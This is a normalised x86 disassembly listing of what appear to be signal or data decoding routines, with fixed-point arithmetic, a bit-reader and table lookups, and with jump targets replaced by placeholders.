and edi 0xffffff80
imul ebx eax
imul edi eax
sar ebx 0x9
lea edi [ edi + ebx + 0x1 ]
sar edi 0x1
jmp r-xdata
lea edx [ edi + edi * 2 ]
sub edx [ ecx + 0x14 ]
lea esi [ ebp + ebp * 2 ]
sub esi [ ecx + 0x34 ]
sar edx 0x1
sar esi 0x1
mov [ ecx + 0x14 ] edi
mov [ ecx + 0x34 ] ebp
mov [ esp + 0x48 ] 0x0
jmp r-xdata
lea edx [ edi + edi ]
sub edx [ ecx + 0x14 ]
lea esi [ ebp + ebp ]
sub esi [ ecx + 0x34 ]
mov [ ecx + 0x14 ] edi
mov [ ecx + 0x34 ] ebp
mov [ esp + 0x48 ] 0x0
jmp r-xdata
mov edx [ ecx + 0xc ]
imul edx eax
add edx 0x200
sar edx 0xa
mov edx eax
mov eax [ ecx + 0xc ]
mov esi edx
sar esi 0x9
and edx 0xffff
and esi 0xffffff80
imul edx eax
imul esi eax
sar edx 0x9
lea edx [ esi + edx + 0x1 ]
mov esi [ esp + 0x34 ]
sar edx 0x1
jmp r-xdata
mov edx [ ecx + 0x8 ]
imul edx eax
add edx 0x200
sar edx 0xa
mov edx eax
mov eax [ ecx + 0x8 ]
mov ebx edx
and edx 0xffff
sar ebx 0x9
imul edx eax
and ebx 0xffffff80
imul ebx eax
sar edx 0x9
lea edx [ ebx + edx + 0x1 ]
sar edx 0x1
jmp r-xdata
mov edi [ ecx + 0x8 ]
imul edi edx
add edi 0x200
sar edi 0xa
mov eax [ ecx + 0x8 ]
mov edi edx
sar edi 0x9
and edx 0xffff
and edi 0xffffff80
imul edx eax
imul edi eax
sar edx 0x9
lea edi [ edi + edx + 0x1 ]
sar edi 0x1
jmp r-xdata
mov eax [ ecx + 0x10 ]
lea edx [ eax + eax * 2 ]
mov eax [ ecx + 0x30 ]
sub edx [ ecx + 0x14 ]
lea esi [ eax + eax * 2 ]
sub esi [ ecx + 0x34 ]
sar edx 0x1
sar esi 0x1
jmp r-xdata
mov edx [ ecx + 0x10 ]
mov esi [ ecx + 0x30 ]
add edx edx
sub edx [ ecx + 0x14 ]
add esi esi
sub esi [ ecx + 0x34 ]
jmp r-xdata
sub esi 0x1
add esi 0x1
mov ecx esi
sub ecx [ esp + 0x38 ]
mov [ edi + 0x130 ] ecx
mov eax [ esp + 0x38 ]
sub eax esi
add ebp eax
jmp r-xdata
cmp ecx 0x7
jg r-xdata
mov eax ecx
cdq
xor eax edx
sub eax edx
cmp eax edi
jg r-xdata
mov ecx esi
imul ecx edx
add ecx 0x200
sar ecx 0xa
mov ecx edx
sar ecx 0x9
mov eax edx
and eax 0xffff
and ecx 0xffffff80
imul eax esi
imul ecx esi
sar eax 0x9
lea ecx [ ecx + eax + 0x1 ]
sar ecx 0x1
jmp r-xdata
cmp ebx 0xfffffffd
mov eax esi
mov [ esp + 0x2c ] eax
jne r-xdata
test eax eax
je r-xdata
mov eax [ esp + 0x2c ]
add esi eax
test edx edx
je r-xdata
movsx eax si
cmp esi eax
mov [ esp + 0x1c ] esi
je r-xdata
test eax eax
je r-xdata
mov eax [ esp + 0x1c ]
add esi eax
test edi edi
je r-xdata
mov edi ebp
imul edi esi
add edi 0x200
sar edi 0xa
mov edi esi
sar edi 0x9
mov ebx esi
and ebx 0xffff
and edi 0xffffff80
imul ebx ebp
imul edi ebp
sar ebx 0x9
lea edi [ edi + ebx + 0x1 ]
sar edi 0x1
jmp r-xdata
mov ebx [ esp + 0x1c ]
mov ebp [ ecx + 0xc ]
add edi ebx
mov [ esp + 0x4c ] edi
movsx edi si
cmp esi edi
je r-xdata
movsx eax dx
cmp edx eax
mov eax [ ecx + 0x8 ]
je r-xdata
movsx edx ax
cmp eax edx
je r-xdata
mov eax [ ecx + 0x10 ]
movsx edx ax
cmp eax edx
je r-xdata
mov eax [ esp + 0x14 ]
add eax edx
cmp ebx 0xfffffffd
mov [ esp + 0x14 ] eax
jne r-xdata
mov edx [ ecx + 0xc ]
imul edx esi
add edx 0x200
sar edx 0xa
add [ esp + 0x14 ] edx
jmp r-xdata
mov eax [ ecx + 0xc ]
mov edx esi
sar edx 0x9
mov ebx esi
and ebx 0xffff
and edx 0xffffff80
imul ebx eax
imul edx eax
sar ebx 0x9
lea edx [ edx + ebx + 0x1 ]
sar edx 0x1
add [ esp + 0x14 ] edx
jmp r-xdata
add esi edx
movsx eax si
cmp esi eax
mov [ esp + 0x34 ] esi
je r-xdata
mov edx [ ecx + 0xc ]
mov edi [ esp + 0x28 ]
imul edx esi
mov esi [ esp + 0x34 ]
add edx 0x200
sar edx 0xa
add [ esp + 0x14 ] edx
jmp r-xdata
mov eax [ ecx + 0xc ]
mov edi [ esp + 0x28 ]
mov edx esi
sar edx 0x9
and esi 0xffff
and edx 0xffffff80
imul esi eax
imul edx eax
sar esi 0x9
lea edx [ edx + esi + 0x1 ]
mov esi [ esp + 0x34 ]
sar edx 0x1
add [ esp + 0x14 ] edx
jmp r-xdata
add [ esp + 0x34 ] edi
movsx edx si
cmp esi edx
je r-xdata
movsx eax dx
cmp edx eax
je r-xdata
mov ecx ebx
mov edx ebp
call sub_40af20
sub esi 0x1
add eax 0x60
jmp r-xdata
lea eax [ esi + ecx ]
lea edx [ eax + esi * 2 ]
mov eax [ esp + 0x24 ]
lea edx [ edx + eax * 8 ]
add eax edx
mov [ esp + 0x24 ] eax
mov eax [ esp + 0x30 ]
mov [ eax ] esi
add eax 0x4
mov [ eax ] ecx
add eax 0x4
mov [ esp + 0x30 ] eax
mov eax [ esp + 0x10 ]
add eax 0x1
cmp eax [ esp + 0xa0 ]
mov [ esp + 0x10 ] eax
jb r-xdata
mov eax [ esp + 0x38 ]
neg eax
mov [ edi + 0x130 ] eax
test esi esi
jge r-xdata
neg ecx
and ebx 0x20000000
je r-xdata
movsx edx si
cmp esi edx
mov edx [ ecx + 0x8 ]
je r-xdata
mov esi [ ecx + 0x10 ]
mov [ ecx + 0x10 ] eax
xor edx eax
mov eax [ ecx + 0xc ]
sar edx 0x1f
xor eax edx
add eax [ ecx + 0x4 ]
sub eax edx
cmp eax 0x400
mov [ ecx + 0xc ] eax
jle r-xdata
mov edx [ ecx + 0xc ]
imul edx esi
add edx 0x200
sar edx 0xa
mov eax [ ecx + 0xc ]
mov edx esi
sar edx 0x9
mov edi esi
and edi 0xffff
and edx 0xffffff80
imul edi eax
imul edx eax
sar edi 0x9
lea edx [ edx + edi + 0x1 ]
sar edx 0x1
jmp r-xdata
xor edi eax
sar edi 0x1f
xor edx edi
add edx [ ecx + 0x4 ]
sub edx edi
cmp edx 0x400
mov [ ecx + 0x8 ] edx
jle r-xdata
test esi esi
je r-xdata
mov ebx [ esp + 0x1c ]
test ebx ebx
je r-xdata
mov ebx [ esp + 0x2c ]
add edi ebx
test edx edx
je r-xdata
mov edx [ ecx + 0x8 ]
imul edx eax
add edx 0x200
sar edx 0xa
mov edx [ esp + 0x14 ]
mov eax [ ecx + 0x8 ]
mov ebx edx
and edx 0xffff
sar ebx 0x9
imul edx eax
and ebx 0xffffff80
imul ebx eax
sar edx 0x9
lea edx [ ebx + edx + 0x1 ]
sar edx 0x1
jmp r-xdata
mov edx eax
mov eax [ ecx + 0x8 ]
mov ebx edx
and edx 0xffff
sar ebx 0x9
imul edx eax
and ebx 0xffffff80
imul ebx eax
sar edx 0x9
lea edx [ ebx + edx + 0x1 ]
sar edx 0x1
jmp r-xdata
add ecx 0x60
test ebp ebp
jne r-xdata
mov edi [ esp + 0x28 ]
jmp r-xdata
imul eax edx
add eax 0x200
sar eax 0xa
sar eax 0x9
mov ebp ecx
and ebp 0xffff
and eax 0xffffff80
imul ebp edx
imul eax edx
sar ebp 0x9
lea eax [ eax + ebp + 0x1 ]
sar eax 0x1
jmp r-xdata
test ecx ecx
je r-xdata
mov edi edx
imul edi esi
add edi 0x200
sar edi 0xa
mov eax esi
sar eax 0x9
mov edi esi
and edi 0xffff
imul edi edx
and eax 0xffffff80
imul eax edx
sar edi 0x9
lea edi [ eax + edi + 0x1 ]
sar edi 0x1
jmp r-xdata
mov eax [ ecx + 0xc ]
xor eax edx
sub eax edx
mov [ ecx + 0xc ] eax
mov [ ecx + 0xc ] 0x400
mov [ esp + 0x2c ] edx
mov [ ecx + 0x10 ] edx
jmp r-xdata
test eax eax
je r-xdata
mov eax [ esp + 0x2c ]
add edx eax
test esi esi
je r-xdata
mov edx [ ecx + 0x8 ]
xor edx edi
sub edx edi
mov [ ecx + 0x8 ] edx
mov [ ecx + 0x8 ] 0x400
mov eax [ esp + 0x4c ]
mov edx [ esp + 0x48 ]
mov ebp [ esp + 0x44 ]
mov [ esp + 0x1c ] eax
mov [ ecx + edx * 4 + 0x10 ] eax
mov [ esp + 0x2c ] edi
mov [ ecx + edx * 4 + 0x30 ] edi
jmp r-xdata
mov eax [ esp + 0x2c ]
test eax eax
je r-xdata
xor edx ebx
mov ebx [ ecx + 0x4 ]
sar edx 0x1f
xor ebx edx
sub ebx edx
add ebx eax
mov [ ecx + 0x8 ] ebx
mov ebx [ ecx ]
sub ebp 0x1
test ebx ebx
jle r-xdata
mov ebx [ esp + 0x20 ]
add esi edx
mov [ esp + 0x34 ] esi
mov edx [ esp + 0x3c ]
neg edx
sub ebp eax
mov [ edi + 0x134 ] edx
mov ecx ebp
jmp r-xdata
test edx edx
jge r-xdata
mov ebp [ esp + 0x14 ]
neg eax
test ebx ebx
je r-xdata
cmp ecx edx
jne r-xdata
mov [ esp + 0x1c ] edi
mov [ ecx + 0x30 ] edi
test eax eax
je r-xdata
mov eax [ esp + 0x1c ]
add edi eax
test esi esi
je r-xdata
add ecx 0x60
test ebp ebp
jne r-xdata
xor esi eax
mov eax [ ecx + 0xc ]
sar esi 0x1f
xor eax esi
add eax [ ecx + 0x4 ]
sub eax esi
cmp eax 0x400
mov [ ecx + 0xc ] eax
jle r-xdata
mov edx [ ecx + 0x4 ]
xor esi eax
sar esi 0x1f
xor edx esi
sub edx esi
add edx ebp
mov [ ecx + 0xc ] edx
mov edi [ esp + 0x40 ]
mov eax esi
cdq
xor eax edx
sub eax edx
cmp eax edi
jg r-xdata
test eax eax
je r-xdata
mov edx ecx
sub edx [ esp + 0x38 ]
mov [ edi + 0x130 ] edx
jmp r-xdata
test ecx ecx
jge r-xdata
mov ebx [ esp + 0x20 ]
xor esi eax
sar esi 0x1f
xor edx esi
add edx [ ecx + 0x4 ]
sub edx esi
cmp edx 0x400
mov [ ecx + 0x8 ] edx
jle r-xdata
mov eax [ ecx + 0xc ]
xor eax esi
sub eax esi
mov [ ecx + 0xc ] eax
mov [ ecx + 0xc ] 0x400
cmp eax ecx
jne r-xdata
sub ebp ecx
mov ecx [ esp + 0x14 ]
sub ecx [ esp + 0x2c ]
mov esi ebp
mov [ esp + 0x3c ] ecx
mov edx [ edi + 0x12c ]
add [ edi + 0x124 ] edx
mov eax [ edi + 0x124 ]
mov ecx [ edi + 0x134 ]
sar eax 0x10
mov edx eax
movsx eax cx
cmp ecx eax
mov eax ecx
je r-xdata
sub ecx 0x1
add ecx 0x1
mov edx ecx
sub edx [ esp + 0x38 ]
mov [ edi + 0x130 ] edx
jmp r-xdata
mov edx [ ecx + 0x8 ]
xor edx esi
sub edx esi
mov [ ecx + 0x8 ] edx
mov [ ecx + 0x8 ] 0x400
mov ecx eax
sub ecx [ esp + 0x3c ]
sub ebp eax
mov [ edi + 0x134 ] ecx
mov ecx ebp
jmp r-xdata
test eax eax
jge r-xdata
sub eax 0x1
add eax 0x1
mov ecx eax
sub ecx [ esp + 0x3c ]
sub ebp eax
mov [ edi + 0x134 ] ecx
mov ecx ebp
jmp r-xdata
sub_40c5e0
push ebp
mov ebp 0x2
cmp eax ebp
jae r-xdata
cmp eax 0x100
push ebx
push edi
jae r-xdata
test eax eax
je r-xdata
cmp eax 0x10000
jae r-xdata
movsx edi [ eax + r--data ]
jmp r-xdata
xor eax eax
pop ebp
retn
mov eax [ esi + 0x14 ]
test eax eax
je r-xdata
cmp eax 0x1000000
jae r-xdata
mov edx eax
shr edx 0x8
movsx edi [ edx + r--data ]
add edi 0x8
jmp r-xdata
mov ebx [ edi * 4 + r--data ]
sub ebx eax
sub ebx 0x1
cmp [ esi + 0x14 ] edi
jge r-xdata
add [ esi + 0x8 ] ebp
mov eax [ esi + 0x8 ]
cmp eax [ esi + 0x4 ]
jne r-xdata
add eax 0xffffffff
mov [ esi + 0x14 ] eax
mov eax [ esi + 0x18 ]
jmp r-xdata
mov edx eax
shr edx 0x18
movsx edi [ edx + r--data ]
add edi 0x18
mov ecx eax
shr ecx 0x10
movsx edi [ ecx + r--data ]
add edi 0x10
jmp r-xdata
mov edx [ esi + 0x18 ]
mov eax [ edi * 4 + r--data ]
and eax edx
cmp eax ebx
jb r-xdata
jmp r-xdata
mov ecx [ esi + 0x8 ]
mov [ esi + 0x14 ] 0xf
movzx eax [ ecx ]
mov [ esi + 0x18 ] eax
mov eax [ esi + 0xc ]
push esi
call eax
add esp 0x4
shr [ esi + 0x18 ] 0x1
and eax 0x1
test eax eax
je r-xdata
sub edi 0x1
lea ecx [ edi - 0x1 ]
mov ebp edx
shr ebp cl
and ebp 0x1
lea eax [ ebp + eax * 2 ]
sub eax ebx
jmp r-xdata
add [ esi + 0x8 ] ebp
mov eax [ esi + 0x8 ]
cmp eax [ esi + 0x4 ]
jne r-xdata
mov eax 0x1
pop ebp
retn
mov ecx edi
sub ebx edi
shr edx cl
pop edi
mov [ esi + 0x14 ] ebx
pop ebx
mov [ esi + 0x18 ] edx
pop ebp
retn
mov ecx [ esi + 0x8 ]
sub ebx edi
mov [ esi + 0x14 ] ebx
movzx edx [ ecx ]
mov ecx 0x10
sub cl bl
shr edx cl
pop edi
pop ebx
pop ebp
mov [ esi + 0x18 ] edx
retn
mov ebx [ esi + 0x14 ]
cmp ebx 0x20
jle r-xdata
mov edx [ esi + 0x8 ]
movzx eax [ edx ]
mov ecx [ esi + 0x14 ]
shl eax cl
add ecx 0x10
mov [ esi + 0x14 ] ecx
or [ esi + 0x18 ] eax
cmp ecx edi
jl r-xdata
mov eax [ esi + 0xc ]
push esi
call eax
add esp 0x4
sub_40c730
mov ecx eax
shr ecx 0x9
add eax ecx
cmp eax 0x100
jae r-xdata
cmp eax 0x10000
jae r-xdata
movsx edx [ eax + r--data ]
mov ecx 0x9
sub ecx edx
shl eax cl
shl edx 0x8
and eax 0xff
movzx eax [ eax + r--data ]
add eax edx
retn
cmp eax 0x1000000
jae r-xdata
mov edx eax
shr edx 0x8
movsx edx [ edx + r--data ]
add edx 0x8
jmp r-xdata
mov edx eax
shr edx 0x18
movsx edx [ edx + r--data ]
add edx 0x18
mov ecx eax
shr ecx 0x10
movsx edx [ ecx + r--data ]
add edx 0x10
jmp r-xdata
lea ecx [ edx - 0x9 ]
shr eax cl
shl edx 0x8
and eax 0xff
movzx eax [ eax + r--data ]
add eax edx
retn
sub_40c7c0
mov edx [ esp + 0x4 ]
test edx edx
jge r-xdata
mov eax edx
and eax 0xff
movzx eax [ eax + r--data ]
sar edx 0x8
or eax 0x100
cmp edx 0x9
jg r-xdata
neg edx
push edx
call sub_40c7c0
add esp 0x4
neg eax
retn
lea ecx [ edx - 0x9 ]
shl eax cl
retn
mov ecx 0x9
sub ecx edx
shr eax cl
retn
sub_40c830
mov eax [ esp + 0x8 ]
push ebx
push esi
mov esi [ eax + 0x4 ]
push edi
mov edi [ esp + 0x10 ]
mov ebx [ edi + 0x18 ]
and ebx 0x40000004
mov ecx ebx
neg ecx
sbb ecx ecx
and ecx 0xfffffffa
add ecx 0xc
cmp [ eax ] ecx
je r-xdata
movzx eax [ esi + 0x1 ]
movzx edx [ esi ]
shl eax 0x8
add eax edx
jns r-xdata
pop edi
pop esi
xor eax eax
pop ebx
retn
mov ecx eax
and ecx 0xff
movzx edx [ ecx + r--data ]
sar eax 0x8
or edx 0x100
cmp eax 0x9
jg r-xdata
neg eax
push eax
call sub_40c7c0
add esp 0x4
neg eax
jmp r-xdata
lea ecx [ eax - 0x9 ]
shl edx cl
mov ecx 0x9
sub ecx eax
shr edx cl
jmp r-xdata
mov [ edi + 0x44 ] eax
movzx eax [ esi + 0x3 ]
movzx edx [ esi + 0x2 ]
shl eax 0x8
add eax edx
jns r-xdata
mov ecx eax
and ecx 0xff
movzx edx [ ecx + r--data ]
sar eax 0x8
or edx 0x100
cmp eax 0x9
jg r-xdata
neg eax
push eax
call sub_40c7c0
add esp 0x4
neg eax
jmp r-xdata
mov eax edx
lea ecx [ eax - 0x9 ]
shl edx cl
mov ecx 0x9
sub ecx eax
shr edx cl
jmp r-xdata
mov [ edi + 0x48 ] eax
movzx eax [ esi + 0x5 ]
movzx edx [ esi + 0x4 ]
shl eax 0x8
add eax edx
jns r-xdata
mov ecx eax
and ecx 0xff
movzx edx [ ecx + r--data ]
sar eax 0x8
or edx 0x100
cmp eax 0x9
jg r-xdata
neg eax
push eax
call sub_40c7c0
add esp 0x4
neg eax
jmp r-xdata
mov eax edx
lea ecx [ eax - 0x9 ]
shl edx cl
mov ecx 0x9
sub ecx eax
shr edx cl
jmp r-xdata
test ebx ebx
mov [ edi + 0x4c ] eax
jne r-xdata
pop edi
pop esi
mov eax 0x1
pop ebx
retn
movzx edx [ esi + 0x7 ]
movzx eax [ esi + 0x6 ]
shl edx 0x8
add edx eax
push edx
call sub_40c7c0
mov [ edi + 0x58 ] eax
movzx ecx [ esi + 0x9 ]
movzx edx [ esi + 0x8 ]
shl ecx 0x8
add ecx edx
push ecx
call sub_40c7c0
mov [ edi + 0x5c ] eax
movzx eax [ esi + 0xb ]
movzx ecx [ esi + 0xa ]
shl eax 0x8
add eax ecx
push eax
call sub_40c7c0
add esp 0xc
mov [ edi + 0x60 ] eax
mov eax edx
sub_40c9a0
mov eax [ esp + 0x8 ]
push ebx
push ebp
mov ebp [ eax ]
push esi
mov esi [ eax + 0x4 ]
push edi
mov edi [ esp + 0x14 ]
mov ebx [ edi + 0x18 ]
add ebp esi
test ebx 0x200
je r-xdata
movzx ecx [ esi + 0x1 ]
movzx edx [ esi ]
shl ecx 0x8
add ecx edx
shl ecx 0x10
add esi 0x2
and ebx 0x40000004
mov [ edi + 0x28 ] ecx
jne r-xdata
movzx edx [ esi + 0x1 ]
movzx eax [ esi ]
shl edx 0x8
add edx eax
jns r-xdata
cmp esi ebp
jae r-xdata
movzx eax [ esi + 0x1 ]
movzx ecx [ esi ]
shl eax 0x8
add eax ecx
shl eax 0x10
mov [ edi + 0x2c ] eax
add esi 0x2
mov ecx edx
and ecx 0xff
movzx eax [ ecx + r--data ]
sar edx 0x8
or eax 0x100
cmp edx 0x9
jg r-xdata
neg edx
push edx
call sub_40c7c0
add esp 0x4
neg eax
jmp r-xdata
xor eax eax
mov [ edi + 0x24 ] eax
mov [ edi + 0x20 ] eax
movzx dx [ esi + 0x1 ]
movzx ax [ esi ]
shl dx 0x8
add dx ax
movsx edx dx
test edx edx
jge r-xdata
lea ecx [ edx - 0x9 ]
shl eax cl
mov ecx 0x9
sub ecx edx
shr eax cl
jmp r-xdata
add esi 0x2
test ebx 0x40000004
mov [ edi + 0x50 ] eax
jne r-xdata
mov ecx edx
and ecx 0xff
movzx eax [ ecx + r--data ]
sar edx 0x8
or eax 0x100
cmp edx 0x9
jg r-xdata
neg edx
push edx
call sub_40c7c0
add esp 0x4
neg eax
jmp r-xdata
movzx edx [ esi + 0x1 ]
movzx eax [ esi ]
shl edx 0x8
add edx eax
push edx
call sub_40c7c0
add esp 0x4
mov [ edi + 0x64 ] eax
add esi 0x2
lea ecx [ edx - 0x9 ]
shl eax cl
mov ecx 0x9
sub ecx edx
shr eax cl
jmp r-xdata
add esi 0x2
test ebx ebx
mov [ edi + 0x20 ] eax
jne r-xdata
cmp esi ebp
jae r-xdata
movzx dx [ esi + 0x1 ]
movzx ax [ esi ]
shl dx 0x8
add dx ax
movsx ecx dx
push ecx
call sub_40c7c0
add esp 0x4
mov [ edi + 0x24 ] eax
add esi 0x2
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
retn
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
retn
sub_40cb10
mov eax [ esi + 0x20 ]
add [ esi + 0x28 ] eax
mov eax [ esi + 0x28 ]
mov ecx [ esi + 0x18 ]
shr eax 0x10
test ecx 0x40000004
je r-xdata
mov edx [ esi + 0x24 ]
add [ esi + 0x2c ] edx
push ebx
mov ebx [ esi + 0x2c ]
shr ebx 0x10
test ecx 0x200
je r-xdata
test ecx 0x200
je r-xdata
push eax
call sub_40c7c0
push ebx
mov [ esi + 0x54 ] eax
call sub_40c7c0
add esp 0x8
mov [ esi + 0x68 ] eax
pop ebx
retn
mov edx [ esi + 0x50 ]
push edi
mov edi [ esi + 0x64 ]
add edx 0x80
add edi 0x80
shr edx 0x8
shr edi 0x8
test ecx 0x400
je r-xdata
push eax
call sub_40c7c0
add esp 0x4
mov [ esi + 0x54 ] eax
retn
mov ecx [ esi + 0x50 ]
add ecx 0x80
shr ecx 0x8
sub ecx eax
cmp ecx 0xffffff00
jle r-xdata
sub edx eax
cmp edx 0xffffff00
jle r-xdata
mov ecx edi
sub ecx edx
lea ecx [ ecx + ebx + 0x1 ]
sar ecx 0x1
cmp ecx eax
jle r-xdata
mov [ esi + 0x54 ] 0x0
retn
add ecx 0x100
push ecx
call sub_40c7c0
add esp 0x4
mov [ esi + 0x54 ] eax
retn
mov [ esi + 0x54 ] 0x0
add edx 0x100
push edx
call sub_40c7c0
add esp 0x4
mov [ esi + 0x54 ] eax
jmp r-xdata
mov ebx ecx
neg ebx
cmp ebx eax
jle r-xdata
lea ebx [ eax + eax ]
xor eax eax
jmp r-xdata
pop edi
mov [ esi + 0x68 ] 0x0
pop ebx
retn
add edi 0x100
push edi
call sub_40c7c0
add esp 0x4
pop edi
mov [ esi + 0x68 ] eax
pop ebx
retn
sub edi ebx
cmp edi 0xffffff00
jle r-xdata
lea ebx [ ecx + eax ]
sub eax ecx
add eax eax
xor ebx ebx
jmp r-xdata
sub_40cc40
sub esp 0xc
push ebx
push ebp
push esi
mov esi edx
push edi
lea eax [ esi + esi * 4 ]
mov edi ecx
lea ebx [ edi + eax * 4 + 0x44 ]
mov eax [ esp + 0x20 ]
test eax eax
mov [ esp + 0x18 ] esi
mov [ esp + 0x10 ] ebx
je r-xdata
mov eax 0xfffffffe
test [ edi + 0x44 ] eax
jne r-xdata
mov [ eax ] 0x0
cmp [ edi + 0x3c ] 0x0
mov ebp 0x8
je r-xdata
cmp [ edi + 0x3c ] 0x0
jne r-xdata
cmp [ edi + 0xcc ] ebp
jge r-xdata
mov [ edi + 0x3c ] 0x0
xor ebp ebp
jmp r-xdata
cmp [ edi + 0x34 ] 0x0
jne r-xdata
mov eax [ edi + 0xd0 ]
and eax 0xff
add [ edi + 0xc0 ] 0x2
mov eax [ edi + 0xc0 ]
cmp eax [ edi + 0xbc ]
jne r-xdata
test [ edi + 0x18 ] 0x8
je r-xdata
test [ edi + 0x58 ] eax
jne r-xdata
movsx ebp [ eax + r--data ]
or ecx 0xffffffff
sub ecx ebp
add [ edi + 0xcc ] ecx
lea ecx [ ebp + 0x1 ]
shr [ edi + 0xd0 ] cl
add [ edi + 0xcc ] 0xfffffff8
shr [ edi + 0xd0 ] 0x8
jmp r-xdata
mov edx [ edi + 0xc0 ]
movzx eax [ edx ]
mov ecx [ edi + 0xcc ]
shl eax cl
or [ edi + 0xd0 ] eax
mov eax [ edi + 0xd0 ]
and eax 0xff
add ecx 0x10
mov [ edi + 0xcc ] ecx
jmp r-xdata
mov ecx [ edi + 0xc4 ]
lea eax [ edi + 0xb8 ]
push eax
call ecx
add esp 0x4
test ebp ebp
jne r-xdata
test esi esi
jne r-xdata
mov eax [ edi + 0x38 ]
test eax eax
je r-xdata
mov eax ebp
and eax 0x1
mov [ edi + 0x34 ] eax
shr ebp 0x1
mov edx ebp
and edx 0x1
shr ebp 0x1
mov [ edi + 0x34 ] edx
add ebp 0x1
jmp r-xdata
mov eax [ edi + 0xcc ]
test eax eax
je r-xdata
cmp eax 0xff
jne r-xdata
mov edx [ esp + 0x10 ]
mov ecx [ edx ]
lea eax [ ecx + 0x80 ]
mov ebx ecx
shr eax 0x7
shr ebx 0x4
lea ecx [ ecx + eax * 4 ]
add ecx eax
add ebx 0x1
cmp ebp 0x1
mov [ edx ] ecx
jne r-xdata
mov ecx [ esp + 0x10 ]
mov eax [ ecx ]
lea edx [ eax + 0x7e ]
shr edx 0x7
mov ebp eax
add edx edx
xor ebx ebx
shr ebp 0x4
sub eax edx
mov [ ecx ] eax
jmp r-xdata
mov esi edi
call sub_40cb10
xor ebp ebp
add eax 0xffffffff
mov [ edi + 0x38 ] eax
je r-xdata
mov ecx [ edi + 0x34 ]
mov esi [ esp + 0x18 ]
not ecx
and ecx 0x1
mov [ edi + 0x3c ] ecx
add [ edi + 0xc0 ] 0x2
mov eax [ edi + 0xc0 ]
cmp eax [ edi + 0xbc ]
jne r-xdata
add eax 0xffffffff
mov [ edi + 0xcc ] eax
mov eax [ edi + 0xd0 ]
jmp r-xdata
mov ecx [ edx + 0x4 ]
mov eax ecx
shr eax 0x4
lea ebx [ ebx + eax + 0x1 ]
lea eax [ ecx + 0x40 ]
shr eax 0x6
lea ecx [ ecx + eax * 4 ]
add ecx eax
cmp ebp 0x2
mov [ edx + 0x4 ] ecx
jne r-xdata
mov ecx edx
mov eax [ ecx + 0x4 ]
lea edx [ eax + 0x3e ]
mov ebp eax
shr edx 0x6
shr ebp 0x4
add edx edx
add ebp ebx
sub eax edx
mov [ ecx + 0x4 ] eax
jmp r-xdata
mov edx [ esp + 0x10 ]
mov eax [ edx + 0x10 ]
lea esi [ ebx + ebp + 0x1 ]
shr esi 0x1
test eax eax
mov [ esp + 0x14 ] esi
jne r-xdata
add [ edi + 0xc0 ] 0x2
mov eax [ edi + 0xc0 ]
cmp eax [ edi + 0xbc ]
jne r-xdata
add eax 0xffffffff
mov [ edi + 0xcc ] eax
mov eax [ edi + 0xd0 ]
jmp r-xdata
mov eax [ ebx + 0xc ]
lea ecx [ eax + 0x80 ]
pop edi
shr ecx 0x8
pop esi
sub eax ecx
mov [ ebx + 0xc ] eax
pop ebp
xor eax eax
pop ebx
add esp 0xc
retn 0x4
mov eax [ edi + 0xc0 ]
mov [ edi + 0xcc ] 0xf
movzx eax [ eax ]
mov [ edi + 0xd0 ] eax
mov edx [ edi + 0xc4 ]
lea ecx [ edi + 0xb8 ]
push ecx
call edx
add esp 0x4
shr [ edi + 0xd0 ] 0x1
and eax 0x1
test eax eax
je r-xdata
mov ecx [ edx + 0x8 ]
mov eax ecx
shr eax 0x4
lea esi [ eax + 0x1 ]
add ebp 0xfffffffe
imul esi ebp
add ebx esi
lea ebp [ eax + ebx ]
lea eax [ ecx + 0x20 ]
shr eax 0x5
lea ecx [ ecx + eax * 4 ]
add ecx eax
mov [ edx + 0x8 ] ecx
mov ecx edx
mov eax [ ecx + 0x8 ]
lea edx [ eax + 0x1e ]
mov ebp eax
shr edx 0x5
shr ebp 0x4
add edx edx
add ebp ebx
sub eax edx
mov [ ecx + 0x8 ] eax
jmp r-xdata
mov ecx ebp
sub ecx ebx
cmp ecx eax
jbe r-xdata
mov eax ebp
sub eax ebx
lea esi [ edi + 0xb8 ]
call sub_40c5e0
add eax ebx
mov [ esp + 0x14 ] eax
mov esi eax
jmp r-xdata
mov ecx [ edi + 0xc0 ]
mov [ edi + 0xcc ] 0xf
movzx eax [ ecx ]
mov [ edi + 0xd0 ] eax
mov eax [ edi + 0xc4 ]
lea edx [ edi + 0xb8 ]
push edx
call eax
add esp 0x4
shr [ edi + 0xd0 ] 0x1
and eax 0x1
test eax eax
je r-xdata
cmp ebp 0x11
je r-xdata
add ebp 0x1
cmp ebp 0x11
jb r-xdata
mov eax [ edi + 0xcc ]
test eax eax
je r-xdata
lea ecx [ ecx ]
cmp ebp 0x21
jne r-xdata
add ebp 0x1
cmp ebp 0x21
jl r-xdata
pop edi
pop esi
pop ebp
mov eax 0x80000000
pop ebx
add esp 0xc
retn 0x4
cmp ebp 0x10
jne r-xdata
add [ edi + 0xc0 ] 0x2
mov eax [ edi + 0xc0 ]
cmp eax [ edi + 0xbc ]
jne r-xdata
add eax 0xffffffff
mov [ edi + 0xcc ] eax
mov eax [ edi + 0xd0 ]
jmp r-xdata
add [ edi + 0xc0 ] 0x2
mov eax [ edi + 0xc0 ]
cmp eax [ edi + 0xbc ]
jne r-xdata
add eax 0xffffffff
mov [ edi + 0xcc ] eax
mov eax [ edi + 0xd0 ]
jmp r-xdata
cmp ebp 0x2
jge r-xdata
mov eax [ edi + 0xcc ]
test eax eax
je r-xdata
cmp [ edi + 0x34 ] 0x0
je r-xdata
xor ebx ebx
mov esi 0xf
mov ebp 0x2
mov edi edi
mov eax [ edi + 0xc0 ]
mov [ edi + 0xcc ] 0xf
movzx eax [ eax ]
mov [ edi + 0xd0 ] eax
mov edx [ edi + 0xc4 ]
lea ecx [ edi + 0xb8 ]
push ecx
call edx
add esp 0x4
shr [ edi + 0xd0 ] 0x1
and eax 0x1
test eax eax
mov [ esp + 0x18 ] 0x1
jne r-xdata
mov ecx [ edi + 0xc0 ]
mov [ edi + 0xcc ] 0xf
movzx eax [ ecx ]
mov [ edi + 0xd0 ] eax
mov eax [ edi + 0xc4 ]
lea edx [ edi + 0xb8 ]
push edx
call eax
add esp 0x4
shr [ edi + 0xd0 ] 0x1
and eax 0x1
test eax eax
je r-xdata
sub ebp 0x1
mov esi 0x1
mov [ edi + 0x38 ] 0x0
je r-xdata
mov [ edi + 0x38 ] ebp
jmp r-xdata
add [ edi + 0xc0 ] ebp
mov eax [ edi + 0xc0 ]
cmp eax [ edi + 0xbc ]
jne r-xdata
